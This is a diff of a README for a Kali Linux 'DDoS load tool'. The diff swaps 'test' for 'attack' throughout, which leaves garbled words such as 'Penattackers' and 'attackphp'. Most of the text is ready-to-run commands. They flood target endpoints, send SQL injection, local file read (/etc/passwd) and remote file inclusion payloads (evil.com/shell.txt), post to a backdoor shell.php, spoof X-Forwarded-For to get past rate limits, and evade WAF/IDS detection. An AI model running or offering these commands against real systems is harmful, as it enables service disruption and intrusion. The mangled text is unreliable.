@@ -8,7 +8,7 @@
 
 **Professional DDoS Load Tool for Powerfull Attacks**
 
-Optimized for Kali Linux | Penetration Testing | Security Assessments
+Optimized for Kali Linux | Penetration attacking | Security Assessments
 
 Developed by **Team Supreme X**
 
@@ -21,9 +21,9 @@ Developed by **Team Supreme X**
 - [Overview](#-overview)
 - [Kali Linux Specific Features](#-kali-linux-specific-features)
 - [Installation on Kali](#-installation-on-kali)
-- [Quick Start for Pentesters](#-quick-start-for-pentesters)
+- [Quick Start for Penattackers](#-quick-start-for-penattackers)
 - [DDoS Attack Scenarios](#-ddos-attack-scenarios)
-- [Penetration Testing Workflows](#-penetration-testing-workflows)
+- [Penetration attacking Workflows](#-penetration-attacking-workflows)
 - [Integration with Kali Tools](#-integration-with-kali-tools)
 - [Advanced Techniques](#-advanced-techniques)
 - [Evasion Techniques](#-evasion-techniques)
@@ -35,16 +35,16 @@ Developed by **Team Supreme X**
 
 ## 🎯 Overview
 
-This DDoS Load Tool is specifically optimized for security professionals using Kali Linux. It's designed for authorized penetration testing, security assessments, and ddos load stress of web applications during security audits.
+This DDoS Load Tool is specifically optimized for security professionals using Kali Linux. It's designed for authorized penetration attacking, security assessments, and ddos load stress of web applications during security audits.
 
 ### Why Use This on Kali Linux?
 
 - ✅ **Pre-configured Python** - Kali comes with Python pre-installed
-- ✅ **Security Focused** - Designed for penetration testing workflows
+- ✅ **Security Focused** - Designed for penetration attacking workflows
 - ✅ **Integration Ready** - Works alongside other Kali tools
 - ✅ **Lightweight** - Minimal resource usage on Kali
 - ✅ **CLI Native** - Perfect for terminal-based workflows
-- ✅ **Scriptable** - Easy to integrate into automated testing
+- ✅ **Scriptable** - Easy to integrate into automated attacking
 
 ---
 
@@ -52,19 +52,19 @@ This DDoS Load Tool is specifically optimized for security professionals using K
 
 ### Optimized for DDoS Attack
 
-1. **DoS/DDoS Simulation** - Test application resilience against denial of service
-2. **Rate Limiting Bypass Testing** - Verify rate limiting implementations
-3. **Session Handling** - Test session management under load
-4. **Authentication Stress** - Test auth endpoints for vulnerabilities
+1. **DoS/DDoS Simulation** - attack application resilience against denial of service
+2. **Rate Limiting Bypass attacking** - Verify rate limiting implementations
+3. **Session Handling** - attack session management under load
+4. **Authentication Stress** - attack auth endpoints for vulnerabilities
 5. **Cache Poisoning Detection** - Identify cache-related vulnerabilities
-6. **Resource Exhaustion** - Test for resource exhaustion vulnerabilities
+6. **Resource Exhaustion** - attack for resource exhaustion vulnerabilities
 
 ### Integration with Kali Workflow
 
 - Works seamlessly with Burp Suite findings
 - Complements nmap and nikto scans
-- Integrates with Metasploit testing
-- Supports OWASP testing methodology
+- Integrates with Metasploit attacking
+- Supports OWASP attacking methodology
 - Compatible with security reporting tools
 
 ---
@@ -100,18 +100,18 @@ cd /opt/ddos-load
 sudo pip3 install -r requirements-kali-linux.txt
 
 # Create symbolic link for easy access
-sudo ln -s /opt/ddos-load/main-kali-linux.py /usr/local/bin/loadtest
+sudo ln -s /opt/ddos-load/main-kali-linux.py /usr/local/bin/loadattack
 
 # Now you can run from anywhere
-loadtest --help
+loadattack --help
 ```
 
 ### Method 3: Virtual Environment (Isolated)
 
 ```bash
 # Create project directory
-mkdir -p ~/pentest/ddos-load
-cd ~/pentest/ddos-load
+mkdir -p ~/penattack/ddos-load
+cd ~/penattack/ddos-load
 
 # Clone repository
 git clone https://github.com/rudraksha-avatara/ddos-load.git .
@@ -136,8 +136,8 @@ python3 --version
 # Check if aiohttp is installed
 pip3 list | grep aiohttp
 
-# Test basic functionality
-python3 main-kali-linux.py http://testphp.vulnweb.com -n 10 -c 2
+# attack basic functionality
+python3 main-kali-linux.py http://attackphp.vulnweb.com -n 10 -c 2
 ```
 
 ### Troubleshooting Installation
@@ -159,51 +159,51 @@ pip3 install --upgrade pip
 
 ---
 
-## ⚡ Quick Start for Pentesters
+## ⚡ Quick Start for Penattackers
 
-### Basic Reconnaissance Load Test
+### Basic Reconnaissance Load attack
 
 ```bash
 # Light probe (won't trigger most IDS)
 python3 main-kali-linux.py http://target.com -n 50 -c 5
 
-# Medium load test
+# Medium load attack
 python3 main-kali-linux.py http://target.com -n 500 -c 25 --no-cache
 
-# Heavy stress test (with authorization)
+# Heavy stress attack (with authorization)
 python3 main-kali-linux.py http://target.com -n 5000 -c 100 --no-cache --random-ua
 ```
 
-### Testing Discovered Endpoints
+### attacking Discovered Endpoints
 
 ```bash
-# After nmap/nikto scan, test discovered endpoints
+# After nmap/nikto scan, attack discovered endpoints
 python3 main-kali-linux.py http://target.com/admin -n 1000 -c 50 --no-cache
 
-# Test API endpoints
+# attack API endpoints
 python3 main-kali-linux.py http://target.com/api/v1/users -n 2000 -c 75 --no-cache
 
-# Test login page
+# attack login page
 python3 main-kali-linux.py http://target.com/login -n 500 -c 30 --no-cache
 ```
 
 ### With Burp Suite Integration
 
 ```bash
-# Test endpoint found in Burp
+# attack endpoint found in Burp
 python3 main-kali-linux.py http://target.com/vulnerable-endpoint \
   -n 1000 -c 50 \
   -H "Cookie: session=abc123" \
   -H "User-Agent: Mozilla/5.0" \
   --no-cache
 
-# Test POST endpoint from Burp
+# attack POST endpoint from Burp
 python3 main-kali-linux.py http://target.com/api/submit \
   -n 500 -c 25 \
   -m POST \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer token123" \
-  --body '{"data":"test"}' \
+  --body '{"data":"attack"}' \
   --no-cache
 ```
 
@@ -211,18 +211,18 @@ python3 main-kali-linux.py http://target.com/api/submit \
 
 ## 🎯 DDoS Attack Scenarios
 
-### 1. Authentication Bypass Testing
+### 1. Authentication Bypass attacking
 
 ```bash
-# Test login endpoint for rate limiting
+# attack login endpoint for rate limiting
 python3 main-kali-linux.py http://target.com/api/login \
   -n 1000 -c 50 \
   -m POST \
   -H "Content-Type: application/json" \
-  --body '{"username":"admin","password":"test"}' \
+  --body '{"username":"admin","password":"attack"}' \
   --no-cache
 
-# Test if rate limiting is implemented
+# attack if rate limiting is implemented
 python3 main-kali-linux.py http://target.com/api/login \
   -d 60 -c 100 \
   -m POST \
@@ -230,16 +230,16 @@ python3 main-kali-linux.py http://target.com/api/login \
   --no-cache
 ```
 
-### 2. Session Management Testing
+### 2. Session Management attacking
 
 ```bash
-# Test session handling under load
+# attack session handling under load
 python3 main-kali-linux.py http://target.com/dashboard \
   -n 2000 -c 100 \
-  -H "Cookie: PHPSESSID=test123" \
+  -H "Cookie: PHPSESSID=attack123" \
   --no-cache
 
-# Test session fixation vulnerability
+# attack session fixation vulnerability
 python3 main-kali-linux.py http://target.com/login \
   -n 500 -c 25 \
   -H "Cookie: SESSIONID=fixed_session" \
@@ -249,18 +249,18 @@ python3 main-kali-linux.py http://target.com/login \
 ### 3. API DDoS Attack
 
 ```bash
-# Test API rate limiting
+# attack API rate limiting
 python3 main-kali-linux.py http://target.com/api/v1/data \
   -n 5000 -c 200 \
   -H "Authorization: Bearer token123" \
   --no-cache
 
-# Test API without authentication
+# attack API without authentication
 python3 main-kali-linux.py http://target.com/api/v1/users \
   -n 1000 -c 50 \
   --no-cache
 
-# Test API with different methods
+# attack API with different methods
 python3 main-kali-linux.py http://target.com/api/v1/resource \
   -n 500 -c 25 \
   -m DELETE \
@@ -270,17 +270,17 @@ python3 main-kali-linux.py http://target.com/api/v1/resource \
 ### 4. DoS Vulnerability Assessment
 
 ```bash
-# Test application resilience (with authorization)
+# attack application resilience (with authorization)
 python3 main-kali-linux.py http://target.com \
   -n 10000 -c 500 \
   --no-cache --random-ua
 
-# Test specific resource-intensive endpoint
-python3 main-kali-linux.py http://target.com/search?q=test \
+# attack specific resource-intensive endpoint
+python3 main-kali-linux.py http://target.com/search?q=attack \
   -d 300 -c 200 \
   --no-cache
 
-# Test file upload endpoint
+# attack file upload endpoint
 python3 main-kali-linux.py http://target.com/upload \
   -n 100 -c 10 \
   -m POST \
@@ -291,13 +291,13 @@ python3 main-kali-linux.py http://target.com/upload \
 ### 5. Cache Poisoning Detection
 
 ```bash
-# Test cache behavior
+# attack cache behavior
 python3 main-kali-linux.py http://target.com/page \
   -n 1000 -c 50 \
   -H "X-Forwarded-Host: evil.com" \
   --no-cache
 
-# Test cache with different headers
+# attack cache with different headers
 python3 main-kali-linux.py http://target.com \
   -n 500 -c 25 \
   -H "X-Original-URL: /admin" \
@@ -307,21 +307,21 @@ python3 main-kali-linux.py http://target.com \
 ### 6. SQL Injection Under Load
 
 ```bash
-# Test if SQL injection is exploitable under load
+# attack if SQL injection is exploitable under load
 python3 main-kali-linux.py "http://target.com/search?id=1' OR '1'='1" \
   -n 500 -c 25 \
   --no-cache
 
-# Test time-based SQL injection
+# attack time-based SQL injection
 python3 main-kali-linux.py "http://target.com/user?id=1' AND SLEEP(5)--" \
   -n 100 -c 10 \
   --timeout 60
 ```
 
-### 7. CSRF Token Testing
+### 7. CSRF Token attacking
 
 ```bash
-# Test CSRF protection under load
+# attack CSRF protection under load
 python3 main-kali-linux.py http://target.com/transfer \
   -n 500 -c 25 \
   -m POST \
@@ -330,10 +330,10 @@ python3 main-kali-linux.py http://target.com/transfer \
   --no-cache
 ```
 
-### 8. XML/XXE Testing
+### 8. XML/XXE attacking
 
 ```bash
-# Test XML endpoint under load
+# attack XML endpoint under load
 python3 main-kali-linux.py http://target.com/api/xml \
   -n 500 -c 25 \
   -m POST \
@@ -342,24 +342,24 @@ python3 main-kali-linux.py http://target.com/api/xml \
   --no-cache
 ```
 
-### 9. File Inclusion Testing
+### 9. File Inclusion attacking
 
 ```bash
-# Test LFI under load
+# attack LFI under load
 python3 main-kali-linux.py "http://target.com/page?file=../../../../etc/passwd" \
   -n 500 -c 25 \
   --no-cache
 
-# Test RFI
+# attack RFI
 python3 main-kali-linux.py "http://target.com/page?file=http://evil.com/shell.txt" \
   -n 200 -c 10 \
   --no-cache
 ```
 
-### 10. Business Logic Testing
+### 10. Business Logic attacking
 
 ```bash
-# Test race condition in payment
+# attack race condition in payment
 python3 main-kali-linux.py http://target.com/api/purchase \
   -n 100 -c 50 \
   -m POST \
@@ -367,7 +367,7 @@ python3 main-kali-linux.py http://target.com/api/purchase \
   --body '{"item_id":123,"quantity":1}' \
   --no-cache
 
-# Test concurrent transactions
+# attack concurrent transactions
 python3 main-kali-linux.py http://target.com/api/transfer \
   -n 50 -c 25 \
   -m POST \
@@ -377,7 +377,7 @@ python3 main-kali-linux.py http://target.com/api/transfer \
 
 ---
 
-## 🔬 Penetration Testing Workflows
+## 🔬 Penetration attacking Workflows
 
 ### Complete Web Application Assessment
 
@@ -386,42 +386,42 @@ python3 main-kali-linux.py http://target.com/api/transfer \
 echo "Phase 1: Reconnaissance"
 python3 main-kali-linux.py http://target.com -n 50 -c 5
 
-# Phase 2: Endpoint Discovery Testing
-echo "Phase 2: Testing discovered endpoints"
+# Phase 2: Endpoint Discovery attacking
+echo "Phase 2: attacking discovered endpoints"
 python3 main-kali-linux.py http://target.com/admin -n 100 -c 10 --no-cache
 python3 main-kali-linux.py http://target.com/api -n 100 -c 10 --no-cache
 
-# Phase 3: Authentication Testing
-echo "Phase 3: Authentication stress test"
+# Phase 3: Authentication attacking
+echo "Phase 3: Authentication stress attack"
 python3 main-kali-linux.py http://target.com/login \
   -n 500 -c 25 -m POST \
-  --body '{"user":"admin","pass":"test"}' \
+  --body '{"user":"admin","pass":"attack"}' \
   --no-cache
 
 # Phase 4: Session Management
-echo "Phase 4: Session handling test"
+echo "Phase 4: Session handling attack"
 python3 main-kali-linux.py http://target.com/dashboard \
   -n 1000 -c 50 \
-  -H "Cookie: session=test123" \
+  -H "Cookie: session=attack123" \
   --no-cache
 
 # Phase 5: API Security
-echo "Phase 5: API stress test"
+echo "Phase 5: API stress attack"
 python3 main-kali-linux.py http://target.com/api/v1/users \
   -n 2000 -c 100 \
   -H "Authorization: Bearer token" \
   --no-cache
 
 # Phase 6: DoS Resilience (with authorization)
-echo "Phase 6: DoS resilience test"
+echo "Phase 6: DoS resilience attack"
 python3 main-kali-linux.py http://target.com \
   -n 5000 -c 200 \
   --no-cache --random-ua
 ```
 
-### Automated Testing Script
+### Automated attacking Script
 
-Create a file `pentest_load.sh`:
+Create a file `penattack_load.sh`:
 
 ```bash
 #!/bin/bash
@@ -430,44 +430,44 @@ TARGET="$1"
 OUTPUT_DIR="results_$(date +%Y%m%d_%H%M%S)"
 
 if [ -z "$TARGET" ]; then
-    echo "Usage: ./pentest_load.sh <target_url>"
+    echo "Usage: ./penattack_load.sh <target_url>"
     exit 1
 fi
 
 mkdir -p "$OUTPUT_DIR"
 
-echo "[*] Starting load testing assessment for $TARGET"
+echo "[*] Starting load attacking assessment for $TARGET"
 echo "[*] Results will be saved to $OUTPUT_DIR"
 
-# Test 1: Baseline
-echo "[+] Test 1: Baseline performance"
+# attack 1: Baseline
+echo "[+] attack 1: Baseline performance"
 python3 main-kali-linux.py "$TARGET" -n 100 -c 10 > "$OUTPUT_DIR/01_baseline.txt"
 
-# Test 2: Moderate load
-echo "[+] Test 2: Moderate load"
+# attack 2: Moderate load
+echo "[+] attack 2: Moderate load"
 python3 main-kali-linux.py "$TARGET" -n 1000 -c 50 --no-cache > "$OUTPUT_DIR/02_moderate.txt"
 
-# Test 3: Heavy load
-echo "[+] Test 3: Heavy load"
+# attack 3: Heavy load
+echo "[+] attack 3: Heavy load"
 python3 main-kali-linux.py "$TARGET" -n 5000 -c 100 --no-cache --random-ua > "$OUTPUT_DIR/03_heavy.txt"
 
-# Test 4: Stress test
-echo "[+] Test 4: Stress test"
+# attack 4: Stress attack
+echo "[+] attack 4: Stress attack"
 python3 main-kali-linux.py "$TARGET" -n 10000 -c 200 --no-cache --random-ua > "$OUTPUT_DIR/04_stress.txt"
 
-# Test 5: Duration test
-echo "[+] Test 5: Duration test (60 seconds)"
+# attack 5: Duration attack
+echo "[+] attack 5: Duration attack (60 seconds)"
 python3 main-kali-linux.py "$TARGET" -d 60 -c 100 --no-cache > "$OUTPUT_DIR/05_duration.txt"
 
-echo "[*] Testing complete! Results saved to $OUTPUT_DIR"
+echo "[*] attacking complete! Results saved to $OUTPUT_DIR"
 echo "[*] Summary:"
 grep "Requests per second" "$OUTPUT_DIR"/*.txt
 ```
 
 Make it executable:
 ```bash
-chmod +x pentest_load.sh
-./pentest_load.sh http://target.com
+chmod +x penattack_load.sh
+./penattack_load.sh http://target.com
 ```
 
 ---
@@ -480,7 +480,7 @@ chmod +x pentest_load.sh
 # First, scan with nmap
 nmap -sV -p 80,443,8080 target.com
 
-# Then test discovered web services
+# Then attack discovered web services
 python3 main-kali-linux.py http://target.com:8080 -n 1000 -c 50 --no-cache
 ```
 
@@ -490,7 +490,7 @@ python3 main-kali-linux.py http://target.com:8080 -n 1000 -c 50 --no-cache
 # Run nikto scan
 nikto -h http://target.com -o nikto_results.txt
 
-# Test endpoints found by nikto
+# attack endpoints found by nikto
 python3 main-kali-linux.py http://target.com/admin -n 500 -c 25 --no-cache
 python3 main-kali-linux.py http://target.com/backup -n 500 -c 25 --no-cache
 ```
@@ -498,7 +498,7 @@ python3 main-kali-linux.py http://target.com/backup -n 500 -c 25 --no-cache
 ### With Burp Suite
 
 ```bash
-# Export request from Burp Suite, then test it
+# Export request from Burp Suite, then attack it
 python3 main-kali-linux.py http://target.com/api/endpoint \
   -n 1000 -c 50 \
   -m POST \
@@ -514,7 +514,7 @@ python3 main-kali-linux.py http://target.com/api/endpoint \
 # First find SQL injection with sqlmap
 sqlmap -u "http://target.com/page?id=1" --batch
 
-# Then test the vulnerable endpoint under load
+# Then attack the vulnerable endpoint under load
 python3 main-kali-linux.py "http://target.com/page?id=1" \
   -n 500 -c 25 --no-cache
 ```
@@ -522,7 +522,7 @@ python3 main-kali-linux.py "http://target.com/page?id=1" \
 ### With Metasploit
 
 ```bash
-# After exploiting with Metasploit, test the backdoor
+# After exploiting with Metasploit, attack the backdoor
 python3 main-kali-linux.py http://target.com/shell.php \
   -n 100 -c 10 \
   -m POST \
@@ -532,7 +532,7 @@ python3 main-kali-linux.py http://target.com/shell.php \
 ### With OWASP ZAP
 
 ```bash
-# After ZAP spider, test discovered endpoints
+# After ZAP spider, attack discovered endpoints
 python3 main-kali-linux.py http://target.com/api/users -n 1000 -c 50 --no-cache
 python3 main-kali-linux.py http://target.com/admin/panel -n 500 -c 25 --no-cache
 ```
@@ -543,7 +543,7 @@ python3 main-kali-linux.py http://target.com/admin/panel -n 500 -c 25 --no-cache
 # After directory brute force
 gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
 
-# Test found directories
+# attack found directories
 python3 main-kali-linux.py http://target.com/admin -n 500 -c 25 --no-cache
 python3 main-kali-linux.py http://target.com/backup -n 500 -c 25 --no-cache
 ```
@@ -554,10 +554,10 @@ python3 main-kali-linux.py http://target.com/backup -n 500 -c 25 --no-cache
 # Scan WordPress site
 wpscan --url http://target.com
 
-# Test WordPress endpoints
+# attack WordPress endpoints
 python3 main-kali-linux.py http://target.com/wp-login.php \
   -n 500 -c 25 -m POST \
-  --body "log=admin&pwd=test" \
+  --body "log=admin&pwd=attack" \
   --no-cache
 
 python3 main-kali-linux.py http://target.com/wp-json/wp/v2/users \
@@ -581,13 +581,13 @@ nikto -h "http://$TARGET" -o nikto_results.txt
 echo "[*] Phase 3: Directory Enumeration"
 gobuster dir -u "http://$TARGET" -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt
 
-echo "[*] Phase 4: Load Testing Main Site"
+echo "[*] Phase 4: Load attacking Main Site"
 python3 main-kali-linux.py "http://$TARGET" -n 1000 -c 50 --no-cache > load_main.txt
 
-echo "[*] Phase 5: Load Testing Admin Panel"
+echo "[*] Phase 5: Load attacking Admin Panel"
 python3 main-kali-linux.py "http://$TARGET/admin" -n 500 -c 25 --no-cache > load_admin.txt
 
-echo "[*] Phase 6: API Stress Test"
+echo "[*] Phase 6: API Stress attack"
 python3 main-kali-linux.py "http://$TARGET/api" -n 2000 -c 100 --no-cache > load_api.txt
 
 echo "[*] Assessment complete!"
@@ -597,7 +597,7 @@ echo "[*] Assessment complete!"
 
 ## 🥷 Advanced Techniques
 
-### 1. Stealth Testing (Low and Slow)
+### 1. Stealth attacking (Low and Slow)
 
 ```bash
 # Very slow, under the radar
@@ -613,7 +613,7 @@ python3 main-kali-linux.py http://target.com \
   --random-ua
 ```
 
-### 2. Distributed Testing Simulation
+### 2. Distributed attacking Simulation
 
 ```bash
 # Simulate distributed attack from single machine
@@ -630,38 +630,38 @@ python3 main-kali-linux.py http://target.com -d 60 -c 50 --random-ua &
 wait
 ```
 
-### 3. Custom User-Agent Testing
+### 3. Custom User-Agent attacking
 
 ```bash
-# Test with specific user agent
+# attack with specific user agent
 python3 main-kali-linux.py http://target.com \
   -n 1000 -c 50 \
   -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)" \
   --no-cache
 
-# Test with mobile user agent
+# attack with mobile user agent
 python3 main-kali-linux.py http://target.com \
   -n 1000 -c 50 \
   -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)" \
   --no-cache
 ```
 
-### 4. Header Injection Testing
+### 4. Header Injection attacking
 
 ```bash
-# Test X-Forwarded-For bypass
+# attack X-Forwarded-For bypass
 python3 main-kali-linux.py http://target.com \
   -n 500 -c 25 \
   -H "X-Forwarded-For: 127.0.0.1" \
   --no-cache
 
-# Test Host header injection
+# attack Host header injection
 python3 main-kali-linux.py http://target.com \
   -n 500 -c 25 \
   -H "Host: evil.com" \
   --no-cache
 
-# Test multiple headers
+# attack multiple headers
 python3 main-kali-linux.py http://target.com \
   -n 500 -c 25 \
   -H "X-Forwarded-For: 127.0.0.1" \
@@ -670,58 +670,58 @@ python3 main-kali-linux.py http://target.com \
   --no-cache
 ```
 
-### 5. Protocol Testing
+### 5. Protocol attacking
 
 ```bash
-# Test HTTP/1.1
+# attack HTTP/1.1
 python3 main-kali-linux.py http://target.com -n 1000 -c 50 --no-cache
 
-# Test HTTPS with various ciphers
+# attack HTTPS with various ciphers
 python3 main-kali-linux.py https://target.com -n 1000 -c 50 --no-cache
 
-# Test with self-signed cert
+# attack with self-signed cert
 python3 main-kali-linux.py https://target.com -n 1000 -c 50 --no-verify-ssl
 ```
 
-### 6. Timing Attack Testing
+### 6. Timing Attack attacking
 
 ```bash
-# Test response time variations
+# attack response time variations
 python3 main-kali-linux.py http://target.com/login \
   -n 100 -c 1 \
   -m POST \
-  --body '{"username":"admin","password":"test"}' \
+  --body '{"username":"admin","password":"attack"}' \
   --no-cache
 
 # Compare with wrong username
 python3 main-kali-linux.py http://target.com/login \
   -n 100 -c 1 \
   -m POST \
-  --body '{"username":"wronguser","password":"test"}' \
+  --body '{"username":"wronguser","password":"attack"}' \
   --no-cache
 ```
 
-### 7. Resource Exhaustion Testing
+### 7. Resource Exhaustion attacking
 
 ```bash
-# Test memory exhaustion
+# attack memory exhaustion
 python3 main-kali-linux.py http://target.com/large-response \
   -n 1000 -c 100 \
   --no-cache
 
-# Test connection exhaustion
+# attack connection exhaustion
 python3 main-kali-linux.py http://target.com \
   -d 300 -c 500 \
   --no-keep-alive \
   --no-cache
 
-# Test bandwidth exhaustion
+# attack bandwidth exhaustion
 python3 main-kali-linux.py http://target.com/download/large-file \
   -n 100 -c 50 \
   --timeout 300
 ```
 
-### 8. Bypass WAF/IDS Testing
+### 8. Bypass WAF/IDS attacking
 
 ```bash
 # Slow requests to avoid detection
@@ -749,7 +749,7 @@ python3 main-kali-linux.py http://target.com \
 ### 9. API Fuzzing Under Load
 
 ```bash
-# Test API with various payloads
+# attack API with various payloads
 python3 main-kali-linux.py http://target.com/api/user/1 -n 100 -c 10 --no-cache
 python3 main-kali-linux.py http://target.com/api/user/-1 -n 100 -c 10 --no-cache
 python3 main-kali-linux.py http://target.com/api/user/999999 -n 100 -c 10 --no-cache
@@ -760,7 +760,7 @@ python3 main-kali-linux.py "http://target.com/api/user/1' OR '1'='1" -n 100 -c 1
 
 ```bash
 #!/bin/bash
-# multi_stage_test.sh
+# multi_stage_attack.sh
 
 TARGET="$1"
 
@@ -782,7 +782,7 @@ sleep 10
 echo "[*] Stage 4: Full Attack (Heavy)"
 python3 main-kali-linux.py "$TARGET" -n 5000 -c 200 --random-ua --no-cache
 
-echo "[*] Multi-stage test complete"
+echo "[*] Multi-stage attack complete"
 ```
 
 ---
@@ -808,13 +808,13 @@ done
 ### 2. Rate Limit Bypass
 
 ```bash
-# Test with X-Forwarded-For rotation
+# attack with X-Forwarded-For rotation
 python3 main-kali-linux.py http://target.com/api \
   -n 1000 -c 50 \
   -H "X-Forwarded-For: 1.2.3.4" \
   --no-cache
 
-# Test with different IPs
+# attack with different IPs
 for ip in 1.1.1.1 8.8.8.8 9.9.9.9; do
     python3 main-kali-linux.py http://target.com/api \
       -n 500 -c 25 \
@@ -892,9 +892,9 @@ echo "[*] Distributed simulation complete"
 # Create report directory
 mkdir -p reports/$(date +%Y%m%d)
 
-# Run tests and save results
+# Run attacks and save results
 python3 main-kali-linux.py http://target.com -n 1000 -c 50 --no-cache \
-  > reports/$(date +%Y%m%d)/baseline_test.txt
+  > reports/$(date +%Y%m%d)/baseline_attack.txt
 
 python3 main-kali-linux.py http://target.com -n 5000 -c 100 --no-cache \
   > reports/$(date +%Y%m%d)/moderate_load.txt
@@ -926,54 +926,54 @@ mkdir -p "$REPORT_DIR"
 
 cat > "$REPORT_DIR/report.txt" << EOF
 ================================================================================
-LOAD TESTING SECURITY ASSESSMENT REPORT
+LOAD attackING SECURITY ASSESSMENT REPORT
 ================================================================================
 
 Client: $CLIENT_NAME
 Target: $TARGET
 Date: $(date +"%Y-%m-%d %H:%M:%S")
-Tester: $(whoami)
+attacker: $(whoami)
 Tool: Advanced DDoS Load Tool v1.0
 
 ================================================================================
 EXECUTIVE SUMMARY
 ================================================================================
 
-This report contains the results of load testing and DoS resilience assessment
+This report contains the results of load attacking and DoS resilience assessment
 performed on $TARGET as part of the security assessment engagement.
 
 ================================================================================
-TEST RESULTS
+attack RESULTS
 ================================================================================
 
 EOF
 
-echo "[*] Running Test 1: Baseline Performance"
-echo "Test 1: Baseline Performance (100 requests, 10 concurrent)" >> "$REPORT_DIR/report.txt"
+echo "[*] Running attack 1: Baseline Performance"
+echo "attack 1: Baseline Performance (100 requests, 10 concurrent)" >> "$REPORT_DIR/report.txt"
 echo "---" >> "$REPORT_DIR/report.txt"
 python3 main-kali-linux.py "$TARGET" -n 100 -c 10 >> "$REPORT_DIR/report.txt" 2>&1
 echo "" >> "$REPORT_DIR/report.txt"
 
-echo "[*] Running Test 2: Moderate Load"
-echo "Test 2: Moderate Load (1000 requests, 50 concurrent)" >> "$REPORT_DIR/report.txt"
+echo "[*] Running attack 2: Moderate Load"
+echo "attack 2: Moderate Load (1000 requests, 50 concurrent)" >> "$REPORT_DIR/report.txt"
 echo "---" >> "$REPORT_DIR/report.txt"
 python3 main-kali-linux.py "$TARGET" -n 1000 -c 50 --no-cache >> "$REPORT_DIR/report.txt" 2>&1
 echo "" >> "$REPORT_DIR/report.txt"
 
-echo "[*] Running Test 3: Heavy Load"
-echo "Test 3: Heavy Load (5000 requests, 100 concurrent)" >> "$REPORT_DIR/report.txt"
+echo "[*] Running attack 3: Heavy Load"
+echo "attack 3: Heavy Load (5000 requests, 100 concurrent)" >> "$REPORT_DIR/report.txt"
 echo "---" >> "$REPORT_DIR/report.txt"
 python3 main-kali-linux.py "$TARGET" -n 5000 -c 100 --no-cache --random-ua >> "$REPORT_DIR/report.txt" 2>&1
 echo "" >> "$REPORT_DIR/report.txt"
 
-echo "[*] Running Test 4: Stress Test"
-echo "Test 4: Stress Test (10000 requests, 200 concurrent)" >> "$REPORT_DIR/report.txt"
+echo "[*] Running attack 4: Stress attack"
+echo "attack 4: Stress attack (10000 requests, 200 concurrent)" >> "$REPORT_DIR/report.txt"
 echo "---" >> "$REPORT_DIR/report.txt"
 python3 main-kali-linux.py "$TARGET" -n 10000 -c 200 --no-cache --random-ua >> "$REPORT_DIR/report.txt" 2>&1
 echo "" >> "$REPORT_DIR/report.txt"
 
-echo "[*] Running Test 5: Sustained Load"
-echo "Test 5: Sustained Load (60 seconds, 100 concurrent)" >> "$REPORT_DIR/report.txt"
+echo "[*] Running attack 5: Sustained Load"
+echo "attack 5: Sustained Load (60 seconds, 100 concurrent)" >> "$REPORT_DIR/report.txt"
 echo "---" >> "$REPORT_DIR/report.txt"
 python3 main-kali-linux.py "$TARGET" -d 60 -c 100 --no-cache >> "$REPORT_DIR/report.txt" 2>&1
 echo "" >> "$REPORT_DIR/report.txt"
@@ -984,7 +984,7 @@ cat >> "$REPORT_DIR/report.txt" << EOF
 FINDINGS AND RECOMMENDATIONS
 ================================================================================
 
-[Add your findings here based on the test results]
+[Add your findings here based on the attack results]
 
 1. Performance Analysis:
    - Review the requests per second metrics
@@ -1003,7 +1003,7 @@ FINDINGS AND RECOMMENDATIONS
 CONCLUSION
 ================================================================================
 
-[Add conclusion based on test results]
+[Add conclusion based on attack results]
 
 ================================================================================
 END OF REPORT
@@ -1030,11 +1030,11 @@ chmod +x generate_report.sh
 ### Quick Summary Extraction
 
 ```bash
-# Extract key metrics from test results
-grep -E "Requests per second|Success Rate|Average:" test_results.txt
+# Extract key metrics from attack results
+grep -E "Requests per second|Success Rate|Average:" attack_results.txt
 
 # Create CSV for spreadsheet
-echo "Test,Requests,Concurrency,RPS,Success_Rate,Avg_Response" > results.csv
+echo "attack,Requests,Concurrency,RPS,Success_Rate,Avg_Response" > results.csv
 grep "Requests per second" *.txt | awk '{print $NF}' >> results.csv
 ```
 
@@ -1046,37 +1046,37 @@ grep "Requests per second" *.txt | awk '{print $NF}' >> results.csv
 
 **This tool can cause service disruption and may be considered an attack if used without authorization.**
 
-### Legal Requirements for Penetration Testing
+### Legal Requirements for Penetration attacking
 
 #### ✅ You MUST Have:
 
 1. **Written Authorization**
    - Signed contract or letter of authorization
-   - Clearly defined scope of testing
+   - Clearly defined scope of attacking
    - Specific IP addresses/domains authorized
-   - Time windows for testing
+   - Time windows for attacking
    - Emergency contact information
 
 2. **Proper Documentation**
    - Keep all authorization documents
-   - Document all testing activities
-   - Record timestamps of tests
-   - Save all test results
+   - Document all attacking activities
+   - Record timestamps of attacks
+   - Save all attack results
 
 3. **Client Notification**
-   - Inform client before testing
+   - Inform client before attacking
    - Notify of any critical findings immediately
    - Provide regular status updates
    - Deliver final report with recommendations
 
 #### ❌ NEVER:
 
-- Test systems without explicit written permission
+- attack systems without explicit written permission
 - Exceed the authorized scope
-- Test outside agreed time windows
+- attack outside agreed time windows
 - Cause intentional damage or data loss
 - Access or exfiltrate sensitive data
-- Test production systems without approval
+- attack production systems without approval
 - Share findings with unauthorized parties
 
 ### Legal Frameworks
@@ -1098,31 +1098,31 @@ grep "Requests per second" *.txt | awk '{print $NF}' >> results.csv
 
 #### International
 - Most countries have cybercrime laws
-- Unauthorized testing may violate multiple jurisdictions
-- Always check local laws before testing
+- Unauthorized attacking may violate multiple jurisdictions
+- Always check local laws before attacking
 
-### Penetration Testing Agreement Template
+### Penetration attacking Agreement Template
 
 ```
-PENETRATION TESTING AUTHORIZATION
+PENETRATION attackING AUTHORIZATION
 
 Client: [Client Name]
-Tester: [Your Name/Company]
+attacker: [Your Name/Company]
 Date: [Date]
 
-SCOPE OF TESTING:
+SCOPE OF attackING:
 - Target Systems: [List specific URLs/IPs]
-- Testing Period: [Start Date/Time] to [End Date/Time]
-- Testing Types: Load Testing, DoS Resilience Assessment
+- attacking Period: [Start Date/Time] to [End Date/Time]
+- attacking Types: Load attacking, DoS Resilience Assessment
 - Excluded Systems: [List any exclusions]
 
 AUTHORIZATION:
-I, [Client Representative Name], [Title], hereby authorize [Tester Name]
-to perform penetration testing activities on the systems listed above
